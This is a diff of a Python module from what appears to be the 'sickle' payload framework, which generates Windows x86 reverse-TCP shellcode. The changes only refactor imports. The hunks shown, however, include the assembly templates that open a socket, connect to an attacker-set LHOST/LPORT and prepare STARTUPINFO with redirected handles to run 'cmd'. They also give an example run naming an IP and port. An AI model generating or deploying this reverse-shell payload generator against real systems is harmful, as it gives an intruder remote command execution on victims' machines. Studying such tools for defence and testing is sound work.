@@ -1,6 +1,7 @@
-import sys
-import ctypes
-import struct
+from sys import argv
+from struct import pack
+from ctypes import sizeof
+from ctypes import c_uint32
 
 from sickle.common.lib.generic.mparser import argument_check
 
@@ -17,21 +18,17 @@ from sickle.common.lib.generic.convert import from_str_to_win_hash
 
 from sickle.common.headers.windows.ntdef import _LIST_ENTRY
 from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-
 from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
 from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS
 from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
 from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER
-
 from sickle.common.headers.windows.winternl import _PEB
 from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
 from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-
 from sickle.common.headers.windows.winsock2 import AF_INET
 from sickle.common.headers.windows.winsock2 import sockaddr
 from sickle.common.headers.windows.winsock2 import SOCK_STREAM
 from sickle.common.headers.windows.winsock2 import IPPROTO_TCP
-
 from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
 from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
 
@@ -45,7 +42,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/shell_reverse_tcp"
 
-    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
@@ -94,13 +91,13 @@ class Shellcode():
         sc_args.update({ 
             "wsaData"                       : 0x000,
             "name"                          : 0x010,
-            "lpStartupInfo"                 : ctypes.sizeof(_STARTUPINFOA),
+            "lpStartupInfo"                 : sizeof(_STARTUPINFOA),
             "lpCommandLine"                 : len("cmd\x00"),
             "lpProcessInformation"          : 0x000,
         })
 
         self.stack_space = calc_stack_space(sc_args,
-                                            ctypes.sizeof(ctypes.c_uint32))
+                                            sizeof(c_uint32))
 
         self.storage_offsets = gen_offsets(sc_args,
                                            Shellcode.arch)
@@ -207,12 +204,12 @@ error:
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
+            src += "    mov ecx, 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() )
             src += "    mov [ebp+{}], ecx\n".format(hex(write_index))
             write_index += 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
             src += "    mov [ebp+{}], cx\n".format(hex(write_index))
             write_index += 2
 
@@ -327,10 +324,10 @@ call_WSASocketA:
 ;                [in] int namelen);
 call_connect:
     xor ecx, ecx
-    mov cl, {ctypes.sizeof(sockaddr)}
+    mov cl, {sizeof(sockaddr)}
     push ecx
     mov dword ptr [ebp + {self.storage_offsets['name'] + 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
-    mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
+    mov dword ptr [ebp + {self.storage_offsets['name']}], 0x{pack('<H', lport).hex()}0002
     lea ecx, [ebp + {self.storage_offsets['name']}]
     push ecx
     push esi
@@ -345,11 +342,11 @@ memsetStructBuffer:
     lea edi, [ebp + {self.storage_offsets['lpStartupInfo']}]
     xor eax, eax
     xor ecx, ecx
-    mov cl, {int( ctypes.sizeof(_STARTUPINFOA) / 0x04 )}
+    mov cl, {int( sizeof(_STARTUPINFOA) / 0x04 )}
     rep stosd
 
 initMembers:
-    mov al, {ctypes.sizeof(_STARTUPINFOA)}
+    mov al, {sizeof(_STARTUPINFOA)}
     mov [ebx], eax
     mov eax, {STARTF_USESTDHANDLES}
     mov [ebx + {_STARTUPINFOA.dwFlags.offset}], eax
